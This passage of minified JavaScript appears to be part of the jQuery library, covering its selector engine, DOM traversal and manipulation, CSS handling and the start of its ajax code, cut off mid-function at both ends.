e=b[1],f=o.filters[e];if(f)return f(a,c,b,d);if(e==="contains")return(a.textContent||a.innerText||n([a])||"").indexOf(b[3])>=0;if(e==="not"){var g=b[3];for(var h=0,i=g.length;h<i;h++)if(g[h]===a)return!1;return!0}m.error(e)},CHILD:function(a,b){var c,e,f,g,h,i,j,k=b[1],l=a;switch(k){case"only":case"first":while(l=l.previousSibling)if(l.nodeType===1)return!1;if(k==="first")return!0;l=a;case"last":while(l=l.nextSibling)if(l.nodeType===1)return!1;return!0;case"nth":c=b[2],e=b[3];if(c===1&&e===0)return!0;f=b[0],g=a.parentNode;if(g&&(g[d]!==f||!a.nodeIndex)){i=0;for(l=g.firstChild;l;l=l.nextSibling)l.nodeType===1&&(l.nodeIndex=++i);g[d]=f}j=a.nodeIndex-e;return c===0?j===0:j%c===0&&j/c>=0}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return b==="*"&&a.nodeType===1||!!a.nodeName&&a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=m.attr?m.attr(a,c):o.attrHandle[c]?o.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];return d==null?f==="!=":!f&&m.attr?d!=null:f==="="?e===g:f==="*="?e.indexOf(g)>=0:f==="~="?(" "+e+" ").indexOf(g)>=0:g?f==="!="?e!==g:f==="^="?e.indexOf(g)===0:f==="$="?e.substr(e.length-g.length)===g:f==="|="?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=o.setFilters[e];if(f)return f(a,c,b,d)}}},p=o.match.POS,q=function(a,b){return"\\"+(b-0+1)};for(var r in o.match)o.match[r]=new RegExp(o.match[r].source+/(?![^\[]*\])(?![^\(]*\))/.source),o.leftMatch[r]=new RegExp(/(^(?:.|\r|\n)*?)/.source+o.match[r].source.replace(/\\(\d+)/g,q));var s=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(t){s=function(a,b){var c=0,d=b||[];if(g.call(a)==="[object Array]")Array.prototype.push.apply(d,a);else if(typeof a.length=="number")for(var e=a.length;c<e;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var u,v;c.documentElement.compareDocumentPosition?u=function(a,b){if(a===b){h=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&4?-1:1}:(u=function(a,b){if(a===b){h=!0;return 0}if(a.sourceIndex&&b.sourceIndex)return a.sourceIndex-b.sourceIndex;var c,d,e=[],f=[],g=a.parentNode,i=b.parentNode,j=g;if(g===i)return v(a,b);if(!g)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k<c&&k<d;k++)if(e[k]!==f[k])return v(e[k],f[k]);return k===c?v(a,f[k],-1):v(e[k],b,1)},v=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),function(){var a=c.createElement("div"),d="script"+(new Date).getTime(),e=c.documentElement;a.innerHTML="<a name='"+d+"'/>",e.insertBefore(a,e.firstChild),c.getElementById(d)&&(o.find.ID=function(a,c,d){if(typeof c.getElementById!="undefined"&&!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!="undefined"&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},o.filter.ID=function(a,b){var c=typeof a.getAttributeNode!="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement("div");a.appendChild(c.createComment("")),a.getElementsByTagName("*").length>0&&(o.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&&d.push(c[e]);c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&typeof a.firstChild.getAttribute!="undefined"&&a.firstChild.getAttribute("href")!=="#"&&(o.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),c.querySelectorAll&&function(){var a=m,b=c.createElement("div"),d="__sizzle__";b.innerHTML="<p class='TEST'></p>";if(!b.querySelectorAll||b.querySelectorAll(".TEST").length!==0){m=function(b,e,f,g){e=e||c;if(!g&&!m.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&&(e.nodeType===1||e.nodeType===9)){if(h[1])return s(e.getElementsByTagName(b),f);if(h[2]&&o.find.CLASS&&e.getElementsByClassName)return s(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b==="body"&&e.body)return s([e.body],f);if(h&&h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return s([],f);if(i.id===h[3])return s([i],f)}try{return s(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&&e.nodeName.toLowerCase()!=="object"){var k=e,l=e.getAttribute("id"),n=l||d,p=e.parentNode,q=/^\s*[+~]/.test(b);l?n=n.replace(/'/g,"\\$&"):e.setAttribute("id",n),q&&p&&(e=e.parentNode);try{if(!q||p)return s(e.querySelectorAll("[id='"+n+"'] "+b),f)}catch(r){}finally{l||k.removeAttribute("id")}}}return a(b,e,f,g)};for(var e in a)m[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement("div"),"div"),e=!1;try{b.call(c.documentElement,"[test!='']:sizzle")}catch(f){e=!0}m.matchesSelector=function(a,c){c=c.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!m.isXML(a))try{if(e||!o.match.PSEUDO.test(c)&&!/!=/.test(c)){var f=b.call(a,c);if(f||!d||a.document&&a.document.nodeType!==11)return f}}catch(g){}return m(c,null,null,[a]).length>0}}}(),function(){var a=c.createElement("div");a.innerHTML="<div class='test e'></div><div class='test'></div>";if(!!a.getElementsByClassName&&a.getElementsByClassName("e").length!==0){a.lastChild.className="e";if(a.getElementsByClassName("e").length===1)return;o.order.splice(1,0,"CLASS"),o.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!="undefined"&&!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?m.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?m.contains=function(a,b){return!!(a.compareDocumentPosition(b)&16)}:m.contains=function(){return!1},m.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":!1};var y=function(a,b,c){var d,e=[],f="",g=b.nodeType?[b]:b;while(d=o.match.PSEUDO.exec(a))f+=d[0],a=a.replace(o.match.PSEUDO,"");a=o.relative[a]?a+"*":a;for(var h=0,i=g.length;h<i;h++)m(a,g[h],e,c);return m.filter(f,e)};m.attr=f.attr,m.selectors.attrMap={},f.find=m,f.expr=m.selectors,f.expr[":"]=f.expr.filters,f.unique=m.uniqueSort,f.text=m.getText,f.isXMLDoc=m.isXML,f.contains=m.contains}();var L=/Until$/,M=/^(?:parents|prevUntil|prevAll)/,N=/,/,O=/^.[^:#\[\.,]*$/,P=Array.prototype.slice,Q=f.expr.match.POS,R={children:!0,contents:!0,next:!0,prev:!0};f.fn.extend({find:function(a){var b=this,c,d;if(typeof a!="string")return f(a).filter(function(){for(c=0,d=b.length;c<d;c++)if(f.contains(b[c],this))return!0});var e=this.pushStack("","find",a),g,h,i;for(c=0,d=this.length;c<d;c++){g=e.length,f.find(a,this[c],e);if(c>0)for(h=g;h<e.length;h++)for(i=0;i<g;i++)if(e[i]===e[h]){e.splice(h--,1);break}}return e},has:function(a){var b=f(a);return this.filter(function(){for(var a=0,c=b.length;a<c;a++)if(f.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(T(this,a,!1),"not",a)},filter:function(a){return this.pushStack(T(this,a,!0),"filter",a)},is:function(a){return!!a&&(typeof a=="string"?Q.test(a)?f(a,this.context).index(this[0])>=0:f.filter(a,this).length>0:this.filter(a).length>0)},closest:function(a,b){var c=[],d,e,g=this[0];if(f.isArray(a)){var h=1;while(g&&g.ownerDocument&&g!==b){for(d=0;d<a.length;d++)f(g).is(a[d])&&c.push({selector:a[d],elem:g,level:h});g=g.parentNode,h++}return c}var i=Q.test(a)||typeof a!="string"?f(a,b||this.context):0;for(d=0,e=this.length;d<e;d++){g=this[d];while(g){if(i?i.index(g)>-1:f.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b||g.nodeType===11)break}}c=c.length>1?f.unique(c):c;return this.pushStack(c,"closest",a)},index:function(a){if(!a)return this[0]&&this[0].parentNode?this.prevAll().length:-1;if(typeof a=="string")return f.inArray(this[0],f(a));return f.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof a=="string"?f(a,b):f.makeArray(a&&a.nodeType?[a]:a),d=f.merge(this.get(),c);return this.pushStack(S(c[0])||S(d[0])?d:f.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),f.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return f.dir(a,"parentNode")},parentsUntil:function(a,b,c){return f.dir(a,"parentNode",c)},next:function(a){return f.nth(a,2,"nextSibling")},prev:function(a){return f.nth(a,2,"previousSibling")},nextAll:function(a){return f.dir(a,"nextSibling")},prevAll:function(a){return f.dir(a,"previousSibling")},nextUntil:function(a,b,c){return f.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return f.dir(a,"previousSibling",c)},siblings:function(a){return f.sibling(a.parentNode.firstChild,a)},children:function(a){return f.sibling(a.firstChild)},contents:function(a){return f.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:f.makeArray(a.childNodes)}},function(a,b){f.fn[a]=function(c,d){var e=f.map(this,b,c);L.test(a)||(d=c),d&&typeof d=="string"&&(e=f.filter(d,e)),e=this.length>1&&!R[a]?f.unique(e):e,(this.length>1||N.test(d))&&M.test(a)&&(e=e.reverse());return this.pushStack(e,a,P.call(arguments).join(","))}}),f.extend({filter:function(a,b,c){c&&(a=":not("+a+")");return b.length===1?f.find.matchesSelector(b[0],a)?[b[0]]:[]:f.find.matches(a,b)},dir:function(a,c,d){var e=[],g=a[c];while(g&&g.nodeType!==9&&(d===b||g.nodeType!==1||!f(g).is(d)))g.nodeType===1&&e.push(g),g=g[c];return e},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&&a!==b&&c.push(a);return c}});var V="abbr|article|aside|audio|canvas|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",W=/ jQuery\d+="(?:\d+|null)"/g,X=/^\s+/,Y=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,Z=/<([\w:]+)/,$=/<tbody/i,_=/<|&#?\w+;/,ba=/<(?:script|style)/i,bb=/<(?:script|object|embed|option|style)/i,bc=new RegExp("<(?:"+V+")","i"),bd=/checked\s*(?:[^=]|=\s*.checked.)/i,be=/\/(java|ecma)script/i,bf=/^\s*<!(?:\[CDATA\[|\-\-)/,bg={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]},bh=U(c);bg.optgroup=bg.option,bg.tbody=bg.tfoot=bg.colgroup=bg.caption=bg.thead,bg.th=bg.td,f.support.htmlSerialize||(bg._default=[1,"div<div>","</div>"]),f.fn.extend({text:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.text(a.call(this,b,c.text()))});if(typeof a!="object"&&a!==b)return this.empty().append((this[0]&&this[0].ownerDocument||c).createTextNode(a));return f.text(this)},wrapAll:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapAll(a.call(this,b))});if(this[0]){var b=f(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapInner(a.call(this,b))});return this.each(function(){var b=f(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=f.isFunction(a);return this.each(function(c){f(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){f.nodeName(this,"body")||f(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=f.clean(arguments);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,f.clean(arguments));return a}},remove:function(a,b){for(var c=0,d;(d=this[c])!=null;c++)if(!a||f.filter(a,[d]).length)!b&&d.nodeType===1&&(f.cleanData(d.getElementsByTagName("*")),f.cleanData([d])),d.parentNode&&d.parentNode.removeChild(d);return this},empty:function()
{for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&&f.cleanData(b.getElementsByTagName("*"));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return f.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(W,""):null;if(typeof a=="string"&&!ba.test(a)&&(f.support.leadingWhitespace||!X.test(a))&&!bg[(Z.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(Y,"<$1></$2>");try{for(var c=0,d=this.length;c<d;c++)this[c].nodeType===1&&(f.cleanData(this[c].getElementsByTagName("*")),this[c].innerHTML=a)}catch(e){this.empty().append(a)}}else f.isFunction(a)?this.each(function(b){var c=f(this);c.html(a.call(this,b,c.html()))}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(f.isFunction(a))return this.each(function(b){var c=f(this),d=c.html();c.replaceWith(a.call(this,b,d))});typeof a!="string"&&(a=f(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;f(this).remove(),b?f(b).before(a):f(c).append(a)})}return this.length?this.pushStack(f(f.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,g,h,i,j=a[0],k=[];if(!f.support.checkClone&&arguments.length===3&&typeof j=="string"&&bd.test(j))return this.each(function(){f(this).domManip(a,c,d,!0)});if(f.isFunction(j))return this.each(function(e){var g=f(this);a[0]=j.call(this,e,c?g.html():b),g.domManip(a,c,d)});if(this[0]){i=j&&j.parentNode,f.support.parentNode&&i&&i.nodeType===11&&i.childNodes.length===this.length?e={fragment:i}:e=f.buildFragment(a,this,k),h=e.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&&f.nodeName(g,"tr");for(var l=0,m=this.length,n=m-1;l<m;l++)d.call(c?bi(this[l],g):this[l],e.cacheable||m>1&&l<n?f.clone(h,!0,!0):h)}k.length&&f.each(k,bp)}return this}}),f.buildFragment=function(a,b,d){var e,g,h,i,j=a[0];b&&b[0]&&(i=b[0].ownerDocument||b[0]),i.createDocumentFragment||(i=c),a.length===1&&typeof j=="string"&&j.length<512&&i===c&&j.charAt(0)==="<"&&!bb.test(j)&&(f.support.checkClone||!bd.test(j))&&(f.support.html5Clone||!bc.test(j))&&(g=!0,h=f.fragments[j],h&&h!==1&&(e=h)),e||(e=i.createDocumentFragment(),f.clean(a,i,e,d)),g&&(f.fragments[j]=h?e:1);return{fragment:e,cacheable:g}},f.fragments={},f.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){f.fn[a]=function(c){var d=[],e=f(c),g=this.length===1&&this[0].parentNode;if(g&&g.nodeType===11&&g.childNodes.length===1&&e.length===1){e[b](this[0]);return this}for(var h=0,i=e.length;h<i;h++){var j=(h>0?this.clone(!0):this).get();f(e[h])[b](j),d=d.concat(j)}return this.pushStack(d,a,e.selector)}}),f.extend({clone:function(a,b,c){var d,e,g,h=f.support.html5Clone||!bc.test("<"+a.nodeName)?a.cloneNode(!0):bo(a);if((!f.support.noCloneEvent||!f.support.noCloneChecked)&&(a.nodeType===1||a.nodeType===11)&&!f.isXMLDoc(a)){bk(a,h),d=bl(a),e=bl(h);for(g=0;d[g];++g)e[g]&&bk(d[g],e[g])}if(b){bj(a,h);if(c){d=bl(a),e=bl(h);for(g=0;d[g];++g)bj(d[g],e[g])}}d=e=null;return h},clean:function(a,b,d,e){var g;b=b||c,typeof b.createElement=="undefined"&&(b=b.ownerDocument||b[0]&&b[0].ownerDocument||c);var h=[],i;for(var j=0,k;(k=a[j])!=null;j++){typeof k=="number"&&(k+="");if(!k)continue;if(typeof k=="string")if(!_.test(k))k=b.createTextNode(k);else{k=k.replace(Y,"<$1></$2>");var l=(Z.exec(k)||["",""])[1].toLowerCase(),m=bg[l]||bg._default,n=m[0],o=b.createElement("div");b===c?bh.appendChild(o):U(b).appendChild(o),o.innerHTML=m[1]+k+m[2];while(n--)o=o.lastChild;if(!f.support.tbody){var p=$.test(k),q=l==="table"&&!p?o.firstChild&&o.firstChild.childNodes:m[1]==="<table>"&&!p?o.childNodes:[];for(i=q.length-1;i>=0;--i)f.nodeName(q[i],"tbody")&&!q[i].childNodes.length&&q[i].parentNode.removeChild(q[i])}!f.support.leadingWhitespace&&X.test(k)&&o.insertBefore(b.createTextNode(X.exec(k)[0]),o.firstChild),k=o.childNodes}var r;if(!f.support.appendChecked)if(k[0]&&typeof (r=k.length)=="number")for(i=0;i<r;i++)bn(k[i]);else bn(k);k.nodeType?h.push(k):h=f.merge(h,k)}if(d){g=function(a){return!a.type||be.test(a.type)};for(j=0;h[j];j++)if(e&&f.nodeName(h[j],"script")&&(!h[j].type||h[j].type.toLowerCase()==="text/javascript"))e.push(h[j].parentNode?h[j].parentNode.removeChild(h[j]):h[j]);else{if(h[j].nodeType===1){var s=f.grep(h[j].getElementsByTagName("script"),g);h.splice.apply(h,[j+1,0].concat(s))}d.appendChild(h[j])}}return h},cleanData:function(a){var b,c,d=f.cache,e=f.event.special,g=f.support.deleteExpando;for(var h=0,i;(i=a[h])!=null;h++){if(i.nodeName&&f.noData[i.nodeName.toLowerCase()])continue;c=i[f.expando];if(c){b=d[c];if(b&&b.events){for(var j in b.events)e[j]?f.event.remove(i,j):f.removeEvent(i,j,b.handle);b.handle&&(b.handle.elem=null)}g?delete i[f.expando]:i.removeAttribute&&i.removeAttribute(f.expando),delete d[c]}}}});var bq=/alpha\([^)]*\)/i,br=/opacity=([^)]*)/,bs=/([A-Z]|^ms)/g,bt=/^-?\d+(?:px)?$/i,bu=/^-?\d/,bv=/^([\-+])=([\-+.\de]+)/,bw={position:"absolute",visibility:"hidden",display:"block"},bx=["Left","Right"],by=["Top","Bottom"],bz,bA,bB;f.fn.css=function(a,c){if(arguments.length===2&&c===b)return this;return f.access(this,a,c,!0,function(a,c,d){return d!==b?f.style(a,c,d):f.css(a,c)})},f.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=bz(a,"opacity","opacity");return c===""?"1":c}return a.style.opacity}}},cssNumber:{fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":f.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,d,e){if(!!a&&a.nodeType!==3&&a.nodeType!==8&&!!a.style){var g,h,i=f.camelCase(c),j=a.style,k=f.cssHooks[i];c=f.cssProps[i]||i;if(d===b){if(k&&"get"in k&&(g=k.get(a,!1,e))!==b)return g;return j[c]}h=typeof d,h==="string"&&(g=bv.exec(d))&&(d=+(g[1]+1)*+g[2]+parseFloat(f.css(a,c)),h="number");if(d==null||h==="number"&&isNaN(d))return;h==="number"&&!f.cssNumber[i]&&(d+="px");if(!k||!("set"in k)||(d=k.set(a,d))!==b)try{j[c]=d}catch(l){}}},css:function(a,c,d){var e,g;c=f.camelCase(c),g=f.cssHooks[c],c=f.cssProps[c]||c,c==="cssFloat"&&(c="float");if(g&&"get"in g&&(e=g.get(a,!0,d))!==b)return e;if(bz)return bz(a,c)},swap:function(a,b,c){var d={};for(var e in b)d[e]=a.style[e],a.style[e]=b[e];c.call(a);for(e in b)a.style[e]=d[e]}}),f.curCSS=f.css,f.each(["height","width"],function(a,b){f.cssHooks[b]={get:function(a,c,d){var e;if(c){if(a.offsetWidth!==0)return bC(a,b,d);f.swap(a,bw,function(){e=bC(a,b,d)});return e}},set:function(a,b){if(!bt.test(b))return b;b=parseFloat(b);if(b>=0)return b+"px"}}}),f.support.opacity||(f.cssHooks.opacity={get:function(a,b){return br.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=f.isNumeric(b)?"alpha(opacity="+b*100+")":"",g=d&&d.filter||c.filter||"";c.zoom=1;if(b>=1&&f.trim(g.replace(bq,""))===""){c.removeAttribute("filter");if(d&&!d.filter)return}c.filter=bq.test(g)?g.replace(bq,e):g+" "+e}}),f(function(){f.support.reliableMarginRight||(f.cssHooks.marginRight={get:function(a,b){var c;f.swap(a,{display:"inline-block"},function(){b?c=bz(a,"margin-right","marginRight"):c=a.style.marginRight});return c}})}),c.defaultView&&c.defaultView.getComputedStyle&&(bA=function(a,b){var c,d,e;b=b.replace(bs,"-$1").toLowerCase(),(d=a.ownerDocument.defaultView)&&(e=d.getComputedStyle(a,null))&&(c=e.getPropertyValue(b),c===""&&!f.contains(a.ownerDocument.documentElement,a)&&(c=f.style(a,b)));return c}),c.documentElement.currentStyle&&(bB=function(a,b){var c,d,e,f=a.currentStyle&&a.currentStyle[b],g=a.style;f===null&&g&&(e=g[b])&&(f=e),!bt.test(f)&&bu.test(f)&&(c=g.left,d=a.runtimeStyle&&a.runtimeStyle.left,d&&(a.runtimeStyle.left=a.currentStyle.left),g.left=b==="fontSize"?"1em":f||0,f=g.pixelLeft+"px",g.left=c,d&&(a.runtimeStyle.left=d));return f===""?"auto":f}),bz=bA||bB,f.expr&&f.expr.filters&&(f.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&&c===0||!f.support.reliableHiddenOffsets&&(a.style&&a.style.display||f.css(a,"display"))==="none"},f.expr.filters.visible=function(a){return!f.expr.filters.hidden(a)});var bD=/%20/g,bE=/\[\]$/,bF=/\r?\n/g,bG=/#.*$/,bH=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bI=/^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bJ=/^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,bK=/^(?:GET|HEAD)$/,bL=/^\/\//,bM=/\?/,bN=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bO=/^(?:select|textarea)/i,bP=/\s+/,bQ=/([?&])_=[^&]*/,bR=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bS=f.fn.load,bT={},bU={},bV,bW,bX=["*/"]+["*"];try{bV=e.href}catch(bY){bV=c.createElement("a"),bV.href="",bV=bV.href}bW=bR.exec(bV.toLowerCase())||[],f.fn.extend({load:function(a,c,d){if(typeof a!="string"&&bS)return bS.apply(this,arguments);if(!this.length)return this;var e=a.indexOf(" ");if(e>=0){var g=a.slice(e,a.length);a=a.slice(0,e)}var h="GET";c&&(f.isFunction(c)?(d=c,c=b):typeof c=="object"&&(c=f.param(c,f.ajaxSettings.traditional),h="POST"));var i=this;f.ajax({url:a,type:h,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),i.html(g?f("<div>").append(c.replace(bN,"")).find(g):c)),d&&i.each(d,[c,b,a])}});return this},serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?f.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bO.test(this.nodeName)||bI.test(this.type))}).map(function(a,b){var c=f(this).val();return c==null?null:f.isArray(c)?f.map(c,function(a,c){return{name:b.name,value:a.replace(bF,"\r\n")}}):{name:b.name,value:c.replace(bF,"\r\n")}}).get()}}),f.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){f.fn[b]=function(a){return this.on(b,a)}}),f.each(["get","post"],function(a,c){f[c]=function(a,d,e,g){f.isFunction(d)&&(g=g||e,e=d,d=b);return f.ajax({type:c,url:a,data:d,success:e,dataType:g})}}),f.extend({getScript:function(a,c){return f.get(a,b,c,"script")},getJSON:function(a,b,c){return f.get(a,b,c,"json")},ajaxSetup:function(a,b){b?b_(a,f.ajaxSettings):(b=a,a=f.ajaxSettings),b_(a,b);return a},ajaxSettings:{url:bV,isLocal:bJ.test(bW[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":bX},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":f.parseJSON,"text xml":f.parseXML},flatOptions:{context:!0,url:!0}},ajaxPrefilter:bZ(bT),ajaxTransport:bZ(bU),ajax:function(a,c){function w(a,c,l,m){if(s!==2){s=2,q&&clearTimeout(q),p=b,n=m||"",v.readyState=a>0?4:0;var o,r,u,w=c,x=l?cb(d,v,l):b,y,z;if(a>=200&&a<300||a===304){if(d.ifModified){if(y=v.getResponseHeader("Last-Modified"))f.lastModified[k]=y;if(z=v.getResponseHeader("Etag"))f.etag[k]=z}if(a===304)w="notmodified",o=!0;else try{r=cc(d,x),w="success",o=!0}catch(A){w="parsererror",u=A}}else{u=w;if(!w||a)w="error",a<0&&(a=0)}v.status=a,v.statusText=""+(c||w),o?h.resolveWith(e,[r,w,v]):h.rejectWith(e,[v,w,u]),v.statusCode(j),j=b,t&&g.trigger("ajax"+(o?"Success":"Error"),[v,d,o?r:u]),i.fireWith(e,[v,w]),t&&(g.trigger("ajaxComplete",[v,d]),--f.active||f.event.trigger("ajaxStop"))}}typeof a=="object"&&(c=a,a=b),c=c||{};var d=f.ajaxSetup({},c),e=d.context||d,g=e!==d&&(e.nodeType||e instanceof f)?f(e):f.event,h=f.Deferred(),i=f.Callbacks("once memory"),j=d.statusCode||{},k,l={},m={},n,o,p,q,r,s=0,t,u,v={readyState:0,setRequestHeader:function(a,b){if(!s){var c=a.toLowerCase();a=m[c]=m[c]||a,l[a]=b}return this},getAllResponseHeaders:function(){return s===2?n:null},getResponseHeader:function(a){var c;if(s===2){if(!o){o={};while(c=bH.exec(n))o[c[1].toLowerCase()]=c[2]}c=o[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){s||(d.mimeType=a);return this},abort:function(a){a=a||"abort",p&&p.abort(a),w(0,a);return this}};h.promise(v),v.success=v.done,v.error=v.fail,v.complete=i.add,v.statusCode=function(a){if(a){var b;if(s<2)for(b in a)j[b]=[j[b],a[b]];else b=a[v.status],v.then(b,b)}return this},d.url=((a||d.url)+"").replace(bG,"").replace(bL,bW[1]+"//"),d.dataTypes=f.trim(d.dataType||"*").toLowerCase().split(bP),d.crossDomain==null&&(r=bR.exec(d.url.toLowerCase()),d.crossDomain=!(!r||r[1]==bW[1]&&r[2]==bW[2]&&(r[3]||(r[1]==="http:"?80:443))==(bW[3]||(bW[1]==="http:"?80:443)))),d.data&&d.processData&&typeof d.data!="string"&&(d.data=f.param(d.data,d.traditional)),b$(bT,d,c,v);if(s===2)return!1;t=d.global,d.type=d.type.toUpperCase(),d.hasContent=!bK.test(d.type),t&&f.active++===0&&f.event.trigger("ajaxStart");if(!d.hasContent){d.data&&(d.url+=(bM.test(d.url)?"&":"?")+d.data,delete d.data),k=d.url;if(d.cache===!1){var x=f.now(),y=d.url.replace(bQ,"$1_="+x);d.url=y+(y===d.url?(bM.test(d.url)?"&":"?")+"_="+x:"")}}(d.data&&d.hasContent&&d.contentType!==!1||c.contentType)&&v.setRequestHeader("Content-Type",d.contentType),d.ifModified&&(k=k||d.url,f.lastModified[k]&&v.setRequestHeader("If-Modified-Since",f.lastModified[k]),f.etag[k]&&v.setRequestHeader("If-None-Match",f.etag[k])),v.setRequestHeader("Accept",d.dataTypes[0]&&d.accepts[d.dataTypes[0]]?d.accepts[d.dataTypes[0]]+(d.dataTypes[0]!=="*"?", "+bX+"; q=0.01":""):d.accepts["*"]);for(u in d.headers)v.setRequestHeader(u,d.headers[u]);if(d.beforeSend&&(d.beforeSend.call(e,v,d)===!1||s===2)){v.abort();return!1}for(u 